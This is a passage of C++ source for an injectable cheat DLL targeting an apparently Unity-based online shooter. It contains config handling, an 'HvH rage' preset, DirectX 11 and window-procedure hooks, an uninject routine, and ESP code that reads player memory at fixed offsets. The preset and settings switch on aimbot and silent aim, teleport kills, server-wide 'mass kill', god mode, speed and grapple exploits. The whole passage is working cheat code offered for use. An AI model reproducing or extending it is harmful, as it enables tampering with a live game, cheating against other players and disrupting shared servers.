            else if (key == "bTeleportHoldKey") bTeleportHoldKey = ParseBool(val);
            else if (key == "iTeleportKey") iTeleportKey = ParseInt(val);
            else if (key == "iTeleportPosition") iTeleportPosition = ParseInt(val);
            else if (key == "iTeleportTargetMode") iTeleportTargetMode = ParseInt(val);
            else if (key == "fTeleportDistance") fTeleportDistance = ParseFloat(val);
            else if (key == "fTeleportHeight") fTeleportHeight = ParseFloat(val);
            else if (key == "bTeleportAutoShoot") bTeleportAutoShoot = ParseBool(val);
            else if (key == "bTeleportLookAt") bTeleportLookAt = ParseBool(val);
            else if (key == "fTeleportShootRate") fTeleportShootRate = ParseFloat(val);

            else if (key == "bEnableMassKill") bEnableMassKill = ParseBool(val);
            else if (key == "fMassKillInterval") fMassKillInterval = ParseFloat(val);
            else if (key == "iMassKillMode") iMassKillMode = ParseInt(val);

            else if (key == "iSelectedWeaponIndex") iSelectedWeaponIndex = ParseInt(val);
            else if (key == "bInfiniteAmmo") bInfiniteAmmo = ParseBool(val);
            else if (key == "bOneHitKillDamage") bOneHitKillDamage = ParseBool(val);
            else if (key == "bRapidFire") bRapidFire = ParseBool(val);
            else if (key == "bInfiniteRange") bInfiniteRange = ParseBool(val);

            else if (key == "bEnableSpeedhack") bEnableSpeedhack = ParseBool(val);
            else if (key == "fSpeedMultiplier") fSpeedMultiplier = ParseFloat(val);
            else if (key == "bEnableSuperJump") bEnableSuperJump = ParseBool(val);
            else if (key == "fJumpMultiplier") fJumpMultiplier = ParseFloat(val);
            else if (key == "bInfiniteAirJump") bInfiniteAirJump = ParseBool(val);
            else if (key == "bZeroGravity") bZeroGravity = ParseBool(val);
            else if (key == "fGravityMultiplier") fGravityMultiplier = ParseFloat(val);
            else if (key == "bBunnyhop") bBunnyhop = ParseBool(val);

            else if (key == "bInfiniteGrappleRange") bInfiniteGrappleRange = ParseBool(val);
            else if (key == "bSuperGrappleSpeed") bSuperGrappleSpeed = ParseBool(val);
            else if (key == "fGrappleSpeedMult") fGrappleSpeedMult = ParseFloat(val);
            else if (key == "bInstantGrappleBoost") bInstantGrappleBoost = ParseBool(val);
            else if (key == "bGrappleMagnetAim") bGrappleMagnetAim = ParseBool(val);

            else if (key == "bCustomFOV") bCustomFOV = ParseBool(val);
            else if (key == "fCustomFOVValue") fCustomFOVValue = ParseFloat(val);

            else if (key == "bGodMode") bGodMode = ParseBool(val);
        } catch (...) {}
    }
    f.close();
    SetConfigStatus("Config loaded successfully from XUYBYA_Config.ini");
}

static void ResetConfigToDefaults() {
    bEnableESP        = false;
    bEnableGlow       = false;
    fGlowIntensity    = 1.0f;
    bDrawBoxes        = false;
    fBoxThickness     = 1.8f;
    bDrawSkeleton     = false;
    fSkeletonThickness= 1.8f;
    bDrawHeadCircle   = false;
    fHeadCircleSize   = 1.0f;
    bDrawTracers      = false;
    iTracerOrigin     = 0;
    fTracerThickness  = 1.8f;
    bDrawHealthBar    = false;
    bDrawInfoText     = false;
    bIgnoreTeammates  = false;
    bIgnoreLocal      = true;
    bIgnoreDead       = true;
    fMaxDistance      = 500.0f;

    colEnemy[0] = 1.0f; colEnemy[1] = 0.22f; colEnemy[2] = 0.35f; colEnemy[3] = 1.0f;
    colTeam[0]  = 0.20f; colTeam[1] = 0.70f; colTeam[2] = 1.00f; colTeam[3] = 1.0f;
    colSkeleton[0] = 0.95f; colSkeleton[1] = 0.95f; colSkeleton[2] = 0.98f; colSkeleton[3] = 0.90f;
    colTracers[0]  = 1.0f; colTracers[1] = 0.85f; colTracers[2] = 0.20f; colTracers[3] = 0.80f;
    colHeadCircle[0]= 1.0f; colHeadCircle[1]= 0.35f; colHeadCircle[2]= 0.50f; colHeadCircle[3]= 1.0f;

    bEnableChams          = false;
    iChamsStyle           = 0;
    fChamsAlpha           = 0.65f;
    fChamsJointSize       = 1.0f;
    bChamsVisibleOnly     = false;
    colChamsEnemyVis[0]   = 1.0f; colChamsEnemyVis[1] = 0.20f; colChamsEnemyVis[2] = 0.40f; colChamsEnemyVis[3] = 0.75f;
    colChamsEnemyOcc[0]   = 0.85f; colChamsEnemyOcc[1] = 0.10f; colChamsEnemyOcc[2] = 0.90f; colChamsEnemyOcc[3] = 0.55f;
    colChamsTeamVis[0]    = 0.20f; colChamsTeamVis[1] = 0.70f; colChamsTeamVis[2] = 1.00f; colChamsTeamVis[3] = 0.75f;
    colChamsTeamOcc[0]    = 0.10f; colChamsTeamOcc[1] = 0.40f; colChamsTeamOcc[2] = 0.80f; colChamsTeamOcc[3] = 0.50f;

    bEnableSilentAim  = false;
    iSilentAimTarget  = 1;
    fSilentAimFOV     = 180.0f;
    bDrawSilentAimFOV = false;
    bSilentAimFull360 = true;

    bEnableAimbot        = false;
    bAimbotAutoFire      = true;
    bAimbotWhileFlashed  = false;
    bAimbotThroughSmoke  = false;
    fKillDelay           = 0.300f;
    fMouseLockX          = 1.000f;
    fMouseLockY          = 1.000f;
    iAimbotKey           = 0; // Alt
    bDrawAimbotFOV       = false;
    iAimbotTarget        = 0;
    aimbotFOV            = 150.0f;
    aimbotSmooth         = 6.0f;
    aimbotMaxSpeed       = 35.0f;

    bRecoilCompensation  = false;
    iRecoilStartBullet   = 1;
    fRecoilX             = 0.000f;
    fRecoilY             = 0.000f;
    fRecoilSmooth        = 1.000f;

    bTriggerbot          = false;
    bTriggerbotHeadOnly  = false;
    fTriggerbotDelay     = 0.050f;

    bEnableTeleportKill = false;
    bTeleportHoldKey    = false;
    iTeleportKey        = 4; // [X]
    iTeleportPosition   = 0;
    iTeleportTargetMode = 0;
    fTeleportDistance   = 1.2f;
    fTeleportHeight     = 0.3f;
    bTeleportAutoShoot  = true;
    bTeleportLookAt     = true;
    fTeleportShootRate  = 45.0f;

    bEnableMassKill     = false;
    fMassKillInterval   = 80.0f;
    iMassKillMode       = 0;

    iSelectedWeaponIndex= 0;
    bInfiniteAmmo       = true;
    bOneHitKillDamage   = true;
    bRapidFire          = true;
    bInfiniteRange      = true;

    bEnableSpeedhack       = false;
    fSpeedMultiplier       = 2.5f;
    bEnableSuperJump       = false;
    fJumpMultiplier        = 2.0f;
    bInfiniteAirJump       = false;
    bZeroGravity           = false;
    fGravityMultiplier     = 1.0f;
    bBunnyhop              = false;

    bInfiniteGrappleRange  = false;
    bSuperGrappleSpeed     = false;
    fGrappleSpeedMult      = 2.5f;
    bInstantGrappleBoost   = false;
    bGrappleMagnetAim      = false;

    bCustomFOV             = false;
    fCustomFOVValue        = 100.0f;

    bGodMode            = false;
    SetConfigStatus("Reset all settings to default state.");
}

// ─── Ultimate HvH (Hack vs Hack / Rage) Config Preset ────────────────────────
static void LoadHvHConfig() {
    // 1. Silent Aim Rage
    bEnableSilentAim       = true;
    iSilentAimTarget       = 1;      // Head Hitbox
    fSilentAimFOV          = 800.0f;
    bDrawSilentAimFOV      = true;
    bSilentAimFull360      = true;   // Hit targets in all 360 degrees

    bEnableAimbot          = false;  // Silent aim takes full priority

    // 2. Mass Kill Server Annihilation
    bEnableMassKill        = true;
    fMassKillInterval      = 50.0f;  // Rapid 50ms server wipe
    iMassKillMode          = 1;      // Multi-Raycast CMDShoot

    // 3. Teleport Kill & Auto-Shoot
    bEnableTeleportKill    = true;
    bTeleportHoldKey       = false;
    iTeleportPosition      = 0;      // Backstab behind enemy
    iTeleportTargetMode    = 0;      // Auto-cycle all enemies on server
    fTeleportDistance      = 1.1f;
    fTeleportHeight        = 0.2f;
    bTeleportAutoShoot     = true;
    bTeleportLookAt        = true;
    fTeleportShootRate     = 35.0f;

    // 4. Weapons & Power Overrides
    bInfiniteAmmo          = true;
    bOneHitKillDamage      = true;
    bRapidFire             = true;
    bInfiniteRange         = true;

    // 5. God Mode
    bGodMode               = true;

    // 6. Movement & Physics Exploits
    bEnableSpeedhack       = true;
    fSpeedMultiplier       = 3.2f;
    bEnableSuperJump       = true;
    fJumpMultiplier        = 2.2f;
    bInfiniteAirJump       = true;   // Fly / infinite double-jump
    bZeroGravity           = false;
    fGravityMultiplier     = 0.85f;
    bBunnyhop              = true;

    // 7. Grappling Hook Exploits
    bInfiniteGrappleRange  = true;   // 9,999m reach
    bSuperGrappleSpeed     = true;   // 4.5x reel force
    fGrappleSpeedMult      = 4.5f;
    bInstantGrappleBoost   = true;   // 0 cooldown
    bGrappleMagnetAim      = true;   // Auto-lock onto players

    // 8. Visuals & Chams
    bEnableESP             = true;
    bDrawBoxes             = true;
    bDrawSkeleton          = true;
    bDrawHeadCircle        = true;
    bDrawTracers           = true;
    bDrawHealthBar         = true;
    bDrawInfoText          = true;
    bEnableGlow            = true;
    fGlowIntensity         = 1.5f;
    bIgnoreTeammates       = true;
    bIgnoreDead            = true;

    bEnableChams           = true;
    iChamsStyle            = 0;      // Solid Flat Silhouette
    fChamsAlpha            = 0.95f;
    fChamsJointSize        = 1.3f;
    colChamsEnemyVis[0]    = 1.00f; colChamsEnemyVis[1] = 0.15f; colChamsEnemyVis[2] = 0.40f; colChamsEnemyVis[3] = 0.95f;
    colChamsTeamVis[0]     = 0.15f; colChamsTeamVis[1]  = 0.65f; colChamsTeamVis[2]  = 1.00f; colChamsTeamVis[3]  = 0.85f;

    // 9. Camera FOV
    bCustomFOV             = true;
    fCustomFOVValue        = 110.0f;

    SaveConfig();
    SetConfigStatus("⚡ HVH RAGE CONFIG ACTIVATED & SAVED!");
}

// ─── D3D11 hooks ──────────────────────────────────────────────────────────────
typedef HRESULT(__stdcall* Present_t)(IDXGISwapChain*, UINT, UINT);
typedef HRESULT(__stdcall* ResizeBuffers_t)(IDXGISwapChain*, UINT, UINT, UINT, DXGI_FORMAT, UINT);
Present_t       oPresent       = nullptr;
ResizeBuffers_t oResizeBuffers = nullptr;

static void CleanupRTV() {
    if (g_mainRenderTargetView) {
        g_mainRenderTargetView->Release();
        g_mainRenderTargetView = nullptr;
    }
}

static void CreateRTV(IDXGISwapChain* pSwapChain) {
    if (!g_pd3dDevice) return;
    ID3D11Texture2D* pBB = nullptr;
    if (SUCCEEDED(pSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBB))) {
        g_pd3dDevice->CreateRenderTargetView(pBB, NULL, &g_mainRenderTargetView);
        pBB->Release();
    }
}

HRESULT __stdcall hkResizeBuffers(IDXGISwapChain* pSC, UINT bc, UINT w, UINT h, DXGI_FORMAT fmt, UINT flags) {
    CleanupRTV();
    HRESULT hr = oResizeBuffers(pSC, bc, w, h, fmt, flags);
    if (SUCCEEDED(hr)) {
        CreateRTV(pSC);
    }
    return hr;
}

extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND, UINT, WPARAM, LPARAM);
WNDPROC oWndProc = nullptr;

// ─── WndProc Hook — Fixed input routing for ImGui interaction ────────────────
static bool g_MenuWasOpen = false;

LRESULT __stdcall WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (!g_IsInitialized || !oWndProc || g_Uninjecting)
        return DefWindowProc(hWnd, uMsg, wParam, lParam);

    // ── Toggle menu with Insert or F1 ──
    if (uMsg == WM_KEYDOWN) {
        if (wParam == VK_INSERT || wParam == VK_F1) {
            g_ShowMenu = !g_ShowMenu;

            // Show/hide mouse cursor when menu opens or closes
            if (g_ShowMenu) {
                ImGui::GetIO().MouseDrawCursor = true;
            } else {
                ImGui::GetIO().MouseDrawCursor = false;
            }
            return 0;
        }
        // ESC closes cheat menu, does NOT propagate to game pause
        if (wParam == VK_ESCAPE && g_ShowMenu) {
            g_ShowMenu = false;
            ImGui::GetIO().MouseDrawCursor = false;
            return 0;
        }
    }

    if (g_ShowMenu) {
        // ─── CRITICAL FIX: Pass events to ImGui FIRST, and only then decide ───
        // Previously events were swallowed BEFORE ImGui saw them — that's why
        // clicks and sliders didn't work. ImGui needs to receive the raw events.
        LRESULT imguiHandled = ImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);

        // Swallow all mouse events — do NOT pass clicks through to game
        if (uMsg >= WM_MOUSEFIRST && uMsg <= WM_MOUSELAST)
            return 0;

        // Block WM_SETCURSOR so the game doesn't change the cursor
        if (uMsg == WM_SETCURSOR) {
            SetCursor(LoadCursor(NULL, IDC_ARROW));
            return 1;
        }

        // Swallow all keyboard events too — stop game from receiving them
        if (uMsg >= WM_KEYFIRST && uMsg <= WM_KEYLAST)
            return 0;
        if (uMsg == WM_CHAR)
            return 0;

        // Block any direct input device events
        if (uMsg == WM_INPUT)
            return 0;

        // For everything else while menu is open — swallow
        return 0;
    }

    return CallWindowProc(oWndProc, hWnd, uMsg, wParam, lParam);
}

// ─── Clean Uninject Routine ─────────────────────────────────────────────────
static DWORD WINAPI UninjectThread(LPVOID /*lpParam*/) {
    g_Uninjecting = true;
    g_ShowMenu = false;
    bEnableESP = false;
    bEnableAimbot = false;
    bEnableTeleportKill = false;
    bGodMode = false;

    Sleep(120);

    // 1. Restore WndProc
    if (g_hWnd && oWndProc) {
        SetWindowLongPtr(g_hWnd, GWLP_WNDPROC, (LONG_PTR)oWndProc);
    }

    // 2. Remove hooks
    MH_DisableHook(MH_ALL_HOOKS);
    MH_Uninitialize();

    Sleep(80);

    // 3. Destroy ImGui
    if (g_IsInitialized) {
        ImGui_ImplDX11_Shutdown();
        ImGui_ImplWin32_Shutdown();
        ImGui::DestroyContext();
    }

    // 4. Release D3D11 resources
    CleanupRTV();

    Sleep(100);

    // 5. Unload DLL from process memory
    if (g_hDllModule) {
        FreeLibraryAndExitThread(g_hDllModule, 0);
    }
    return 0;
}

void RequestUninject() {
    CreateThread(nullptr, 0, UninjectThread, nullptr, 0, nullptr);
}

// ─── Helper to resolve bone world & screen position ──────────────────────────
static void ResolveBoneSafe(void* mainCam, void* rbPtr, BonePoint& outBone) {
    outBone.valid = false;
    if (!rbPtr || !mainCam) return;

    __try {
        if (g_Il2Cpp.GetRigidbodyPosition(rbPtr, &outBone.world)) {
            if (fabsf(outBone.world.x) < 0.001f && fabsf(outBone.world.y) < 0.001f && fabsf(outBone.world.z) < 0.001f)
                return;

            if (g_Il2Cpp.WorldToScreen(mainCam, outBone.world, &outBone.screen)) {
                if (outBone.screen.z > 0.5f && outBone.screen.z < 500.0f &&
                    !std::isnan(outBone.screen.z) && !std::isinf(outBone.screen.z) &&
                    !std::isnan(outBone.screen.x) && !std::isnan(outBone.screen.y) &&
                    !std::isinf(outBone.screen.x) && !std::isinf(outBone.screen.y)) {

                    ImGuiIO& io = ImGui::GetIO();
                    float sw = io.DisplaySize.x;
                    float sh = io.DisplaySize.y;
                    if (outBone.screen.x >= -150.0f && outBone.screen.x <= sw + 150.0f &&
                        outBone.screen.y >= -150.0f && outBone.screen.y <= sh + 150.0f) {
                        outBone.valid = true;
                    }
                }
            }
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        outBone.valid = false;
    }
}

// ─── Helper to get the currently active camera (Alive, Dead, or Spectating) ──
static void* GetCurrentGameCamera() {
    __try {
        // 1. Prioritize Local PlayerMovement -> _cam -> cam
        if (g_PlayerMovementClass) {
            Il2CppArray* pmArr = g_Il2Cpp.FindObjectsOfType(g_PlayerMovementClass);
            if (pmArr) {
                uintptr_t cnt = *(uintptr_t*)((char*)pmArr + 0x18);
                if (cnt > 0 && cnt <= 64) {
                    void** items = (void**)((char*)pmArr + 0x20);
                    for (uintptr_t i = 0; i < cnt; i++) {
                        if (items[i] && g_Il2Cpp.IsLocalPlayer(items[i])) {
                            void* rCamCtrl = *(void**)((char*)items[i] + 0x220);
                            if (rCamCtrl) {
                                void* rCam = *(void**)((char*)rCamCtrl + 0x140);
                                if (rCam) return rCam;
                            }
                        }
                    }
                }
            }
        }

        // 2. Prioritize Local RagdollCameraController -> cam
        if (g_RagdollCamClass) {
            Il2CppArray* camArr = g_Il2Cpp.FindObjectsOfType(g_RagdollCamClass);
            if (camArr) {
                uintptr_t cnt = *(uintptr_t*)((char*)camArr + 0x18);
                if (cnt > 0 && cnt <= 64) {
                    void** items = (void**)((char*)camArr + 0x20);
                    for (uintptr_t i = 0; i < cnt; i++) {
                        if (items[i] && g_Il2Cpp.IsLocalPlayer(items[i])) {
                            void* rCam = *(void**)((char*)items[i] + 0x140);
                            if (rCam) return rCam;
                        }
                    }
                }
            }
        }

        // 3. Fallback to Camera.main / current
        return g_Il2Cpp.GetMainCamera();
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        return nullptr;
    }
}

// ─── Safe Frame Update (Render Thread — Zero Crashes on Death & Despawn) ─────
static void UpdateFrameESPData() {
    if (!bEnableESP && !bEnableAimbot && !bEnableSilentAim) {
        g_ESPData.clear();
        return;
    }

    __try {
        void* activeCam = GetCurrentGameCamera();
        if (!activeCam) return;

        std::vector<PlayerESPData> newData;

        Il2CppArray* arr = nullptr;
        if (g_PlayerClass) {
            arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
        }

        if (arr) {
            uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
            if (count == 0 || count > 128) return;

            void** items = (void**)((char*)arr + 0x20);

            // 1. Identify local player and their real team
            bool localAwayTeam = false;
            bool foundLocal = false;

            for (uintptr_t i = 0; i < count; i++) {
                void* playerObj = items[i];
                if (!playerObj) continue;

                if (g_Il2Cpp.IsLocalPlayer(playerObj)) {
                    foundLocal = true;
                    if (g_PlayerMovementClass) {
                        void* pm = g_Il2Cpp.GetComponent(playerObj, g_PlayerMovementClass);
                        if (pm) {
                            localAwayTeam = *(bool*)((char*)pm + 0x1C4);
                        }
                    }
                    break;
                }
            }

            for (uintptr_t i = 0; i < count; i++) {
                void* playerObj = items[i];
                if (!playerObj) continue;

                // Filter out inactive / despawned game objects
                if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(playerObj))
                    continue;

                if (!g_Il2Cpp.IsSpawned(playerObj))
                    continue;

                PlayerESPData data{};
                data.isLocal = g_Il2Cpp.IsLocalPlayer(playerObj);

                // Read Health & Team
                data.maxHp = 100;
                data.hp    = 100;
                data.isDead= false;

                if (g_HealthClass) {
                    void* healthComp = g_Il2Cpp.GetComponent(playerObj, g_HealthClass);
                    if (healthComp) {
                        data.maxHp = *(int*)((char*)healthComp + 0xF8);
                        if (g_GetCurrentHealth) {
                            void* exc = nullptr;
                            Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(
                                g_GetCurrentHealth, healthComp, nullptr, &exc);
                            if (res && !exc) {
                                data.hp = *(int*)((char*)res + 0x10);
                            }
                        }
                        if (g_IsDeadMethod) {
                            void* exc = nullptr;
                            Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(
                                g_IsDeadMethod, healthComp, nullptr, &exc);
                            if (res && !exc) {
                                data.isDead = *(bool*)((char*)res + 0x10);
                            }
                        }
                    }
                }

                if (bIgnoreDead && (data.isDead || data.hp <= 0)) {
                    continue;
                }

                // Team resolution
                if (g_PlayerMovementClass) {
                    void* pm = g_Il2Cpp.GetComponent(playerObj, g_PlayerMovementClass);
                    if (pm) {
                        data.awayTeam = *(bool*)((char*)pm + 0x1C4);
                    }
                } else if (g_SharedRefClass) {
                    void* sharedRef = g_Il2Cpp.GetComponent(playerObj, g_SharedRefClass);
                    if (sharedRef) {
                        data.awayTeam = *(bool*)((char*)sharedRef + 0x108);
                    }
                }

                if (bIgnoreTeammates && foundLocal && (data.awayTeam == localAwayTeam) && !data.isLocal) {
                    continue;
                }

                data.isEnemy = foundLocal ? (data.awayTeam != localAwayTeam) : true;

                // Read all 15 physics Rigidbody pointers safely
                void* spineRb     = *(void**)((char*)playerObj + 0x100);
                void* rootRb      = *(void**)((char*)playerObj + 0x108);
                void* lFootRb     = *(void**)((char*)playerObj + 0x110);
                void* rFootRb     = *(void**)((char*)playerObj + 0x118);
                void* lKneeRb     = *(void**)((char*)playerObj + 0x120);
                void* rKneeRb     = *(void**)((char*)playerObj + 0x128);
                void* lHandRb     = *(void**)((char*)playerObj + 0x130);
                void* rHandRb     = *(void**)((char*)playerObj + 0x138);
                void* lElbowRb    = *(void**)((char*)playerObj + 0x140);
                void* rElbowRb    = *(void**)((char*)playerObj + 0x148);
                void* lUpperArmRb = *(void**)((char*)playerObj + 0x150);
                void* rUpperArmRb = *(void**)((char*)playerObj + 0x158);
                void* lShoulderRb = *(void**)((char*)playerObj + 0x160);
                void* rShoulderRb = *(void**)((char*)playerObj + 0x168);
                void* chestRb     = *(void**)((char*)playerObj + 0x170);

                ResolveBoneSafe(activeCam, chestRb,     data.chest);
                ResolveBoneSafe(activeCam, spineRb,     data.spine);
                ResolveBoneSafe(activeCam, rootRb,      data.root);
                ResolveBoneSafe(activeCam, lShoulderRb, data.lShoulder);
                ResolveBoneSafe(activeCam, lUpperArmRb, data.lUpperArm);
                ResolveBoneSafe(activeCam, lElbowRb,    data.lElbow);
                ResolveBoneSafe(activeCam, lHandRb,     data.lHand);
                ResolveBoneSafe(activeCam, rShoulderRb, data.rShoulder);
                ResolveBoneSafe(activeCam, rUpperArmRb, data.rUpperArm);
                ResolveBoneSafe(activeCam, rElbowRb,    data.rElbow);
                ResolveBoneSafe(activeCam, rHandRb,     data.rHand);
                ResolveBoneSafe(activeCam, lKneeRb,     data.lKnee);
                ResolveBoneSafe(activeCam, lFootRb,     data.lFoot);
                ResolveBoneSafe(activeCam, rKneeRb,     data.rKnee);
                ResolveBoneSafe(activeCam, rFootRb,     data.rFoot);

                if (!data.chest.valid && !data.root.valid)
                    continue;

                // Synthesize Head point from Chest position (+0.38m up)
                if (data.chest.valid) {
                    data.head.world = data.chest.world + Vector3(0.0f, 0.38f, 0.0f);
                    if (g_Il2Cpp.WorldToScreen(activeCam, data.head.world, &data.head.screen)) {
                        if (data.head.screen.z > 0.5f && data.head.screen.z < 500.0f) data.head.valid = true;
                    }
                }

                std::vector<Vector3> validPoints;
                auto AddPoint = [&](const BonePoint& b) {
                    if (b.valid && b.screen.z > 0.5f) validPoints.push_back(b.screen);
                };

                AddPoint(data.head);
                AddPoint(data.chest);
                AddPoint(data.spine);
                AddPoint(data.root);
                AddPoint(data.lShoulder);
                AddPoint(data.lUpperArm);
                AddPoint(data.lElbow);
                AddPoint(data.lHand);
                AddPoint(data.rShoulder);
                AddPoint(data.rUpperArm);
                AddPoint(data.rElbow);
                AddPoint(data.rHand);
                AddPoint(data.lKnee);
                AddPoint(data.lFoot);
                AddPoint(data.rKnee);
                AddPoint(data.rFoot);

                if (validPoints.size() >= 2) {
                    float minX = 999999.0f, maxX = -999999.0f;
                    float minY = 999999.0f, maxY = -999999.0f;
                    float totalZ = 0.0f;

                    ImGuiIO& io = ImGui::GetIO();
                    float sh = io.DisplaySize.y;

                    for (const auto& pt : validPoints) {
                        float sx = pt.x;
                        float sy = sh - pt.y;

                        if (sx < minX) minX = sx;
                        if (sx > maxX) maxX = sx;
                        if (sy < minY) minY = sy;
                        if (sy > maxY) maxY = sy;

                        totalZ += pt.z;
                    }

                    data.distance = totalZ / (float)validPoints.size();
                    if (data.distance > fMaxDistance || data.distance < 0.3f) continue;

                    float rawW = maxX - minX;
                    float rawH = maxY - minY;
                    if (rawW < 2.0f && rawH < 2.0f) continue;

                    float padX = (data.distance > 0.1f) ? (12.0f / data.distance * 2.0f) : 8.0f;
                    float padY = (data.distance > 0.1f) ? (8.0f / data.distance * 2.0f) : 6.0f;
                    if (padX < 4.0f) padX = 4.0f;
                    if (padX > 24.0f) padX = 24.0f;
                    if (padY < 4.0f) padY = 4.0f;
                    if (padY > 20.0f) padY = 20.0f;

                    data.boxMinX = minX - padX;
                    data.boxMaxX = maxX + padX;
                    data.boxMinY = minY - padY;
                    data.boxMaxY = maxY + padY;

                    float boxW = data.boxMaxX - data.boxMinX;
                    float boxH = data.boxMaxY - data.boxMinY;

                    float sw = io.DisplaySize.x;
                    if (boxW < 6.0f || boxH < 8.0f || boxW > sw * 0.70f || boxH > sh * 0.85f)
                        continue;

                    if (data.boxMaxX < -40.0f || data.boxMinX > sw + 40.0f || data.boxMaxY < -40.0f || data.boxMinY > sh + 40.0f)
                        continue;

                    data.hasBox  = true;

                    if (data.chest.valid) {
                        data.aimScreenPos = data.chest.screen;
                    } else if (data.head.valid) {
                        data.aimScreenPos = data.head.screen;
                    } else {
                        data.aimScreenPos = validPoints[0];
                    }

                    newData.push_back(data);
                }
            }
        }

        g_ESPData = std::move(newData);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        g_ESPData.clear();
    }
}

// ─── ESP Drawing (With Glow & Dynamic Custom Colors) ─────────────────────────
static void DrawESP(ImGuiIO& io) {
    auto* dl = ImGui::GetBackgroundDrawList();
    float sw = io.DisplaySize.x;
    float sh = io.DisplaySize.y;

    auto MakeGlowColor = [](float* baseCol, float alphaMultiplier) -> ImU32 {
        float a = baseCol[3] * alphaMultiplier;
        if (a > 1.0f) a = 1.0f;
        if (a < 0.0f) a = 0.0f;
        return ImGui::ColorConvertFloat4ToU32(ImVec4(baseCol[0], baseCol[1], baseCol[2], a));
    };

    auto DrawBoneLine = [&](const BonePoint& a, const BonePoint& b, float* baseCol, float thick) {
        if (a.valid && b.valid) {
            ImVec2 p1(a.screen.x, sh - a.screen.y);
            ImVec2 p2(b.screen.x, sh - b.screen.y);

            if ((p1.x < -100.0f && p2.x < -100.0f) || (p1.x > sw + 100.0f && p2.x > sw + 100.0f) ||
                (p1.y < -100.0f && p2.y < -100.0f) || (p1.y > sh + 100.0f && p2.y > sh + 100.0f)) {
                return;
            }

            if (bEnableGlow) {
                ImU32 glowColOuter = MakeGlowColor(baseCol, 0.18f * fGlowIntensity);
                ImU32 glowColMid   = MakeGlowColor(baseCol, 0.35f * fGlowIntensity);
                dl->AddLine(p1, p2, glowColOuter, thick + 4.0f);
                dl->AddLine(p1, p2, glowColMid,   thick + 2.0f);
            }

            ImU32 coreCol = MakeGlowColor(baseCol, 1.0f);
            dl->AddLine(p1, p2, coreCol, thick);
        }
    };

    auto DrawChamsSegment = [&](const BonePoint& a, const BonePoint& b, float* color, float alpha, float jointRadius, int style) {
        if (!a.valid || !b.valid) return;
        if (a.screen.z <= 0.5f || b.screen.z <= 0.5f) return;

        ImVec2 p1(a.screen.x, sh - a.screen.y);
        ImVec2 p2(b.screen.x, sh - b.screen.y);

        if ((p1.x < -120.0f && p2.x < -120.0f) || (p1.x > sw + 120.0f && p2.x > sw + 120.0f) ||
            (p1.y < -120.0f && p2.y < -120.0f) || (p1.y > sh + 120.0f && p2.y > sh + 120.0f)) {
            return;
        }

        ImVec4 col4(color[0], color[1], color[2], color[3] * alpha);
        ImU32 chamsCol = ImGui::ColorConvertFloat4ToU32(col4);
        ImU32 glowCol  = ImGui::ColorConvertFloat4ToU32(ImVec4(color[0], color[1], color[2], color[3] * alpha * 0.4f));

        float dist = (a.screen.z + b.screen.z) * 0.5f;
        float thick = (dist > 0.5f) ? (22.0f / dist * jointRadius) : 6.0f;
        if (thick < 3.0f) thick = 3.0f;
        if (thick > 36.0f) thick = 36.0f;

        if (style == 0) { // Solid Flat Silhouette
            dl->AddLine(p1, p2, chamsCol, thick);
            dl->AddCircleFilled(p1, thick * 0.5f, chamsCol, 12);
            dl->AddCircleFilled(p2, thick * 0.5f, chamsCol, 12);
        } else if (style == 1) { // Translucent Glass
            dl->AddLine(p1, p2, glowCol, thick + 4.0f);
            dl->AddLine(p1, p2, chamsCol, thick);
            dl->AddCircleFilled(p1, thick * 0.5f, chamsCol, 12);
            dl->AddCircleFilled(p2, thick * 0.5f, chamsCol, 12);
        } else if (style == 2) { // Wireframe
            dl->AddLine(p1, p2, chamsCol, thick * 0.5f);
            dl->AddCircle(p1, thick * 0.6f, chamsCol, 8, 1.5f);
            dl->AddCircle(p2, thick * 0.6f, chamsCol, 8, 1.5f);
        } else if (style == 3) { // Neon Pulse
            float pulse = 0.6f + 0.4f * sinf((float)GetTickCount64() * 0.005f);
            ImU32 pulseCol = ImGui::ColorConvertFloat4ToU32(ImVec4(color[0], color[1], color[2], color[3] * alpha * pulse));
            dl->AddLine(p1, p2, pulseCol, thick + 6.0f);
            dl->AddLine(p1, p2, chamsCol, thick);
            dl->AddCircleFilled(p1, thick * 0.5f, chamsCol, 12);
            dl->AddCircleFilled(p2, thick * 0.5f, chamsCol, 12);
        }
    };

    for (const auto& p : g_ESPData) {
        if (!p.hasBox) continue;
        if (p.isLocal && bIgnoreLocal) continue;

        float* pCol = p.isEnemy ? colEnemy : colTeam;

        ImU32 colMain = MakeGlowColor(pCol, 1.0f);
        ImU32 colTrac = MakeGlowColor(colTracers, 1.0f);

        // 0. Customizable Solid / Glass / Wireframe / Pulse Chams
        if (bEnableChams) {
            float* chamsCol = p.isEnemy ? colChamsEnemyVis : colChamsTeamVis;

            DrawChamsSegment(p.head, p.chest, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);
            DrawChamsSegment(p.chest, p.spine, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);
            DrawChamsSegment(p.spine, p.root, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);

            DrawChamsSegment(p.chest, p.lShoulder, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);
            DrawChamsSegment(p.lShoulder, p.lUpperArm, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);
            DrawChamsSegment(p.lUpperArm, p.lElbow, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);
            DrawChamsSegment(p.lElbow, p.lHand, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);

            DrawChamsSegment(p.chest, p.rShoulder, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);
            DrawChamsSegment(p.rShoulder, p.rUpperArm, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);
            DrawChamsSegment(p.rUpperArm, p.rElbow, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);
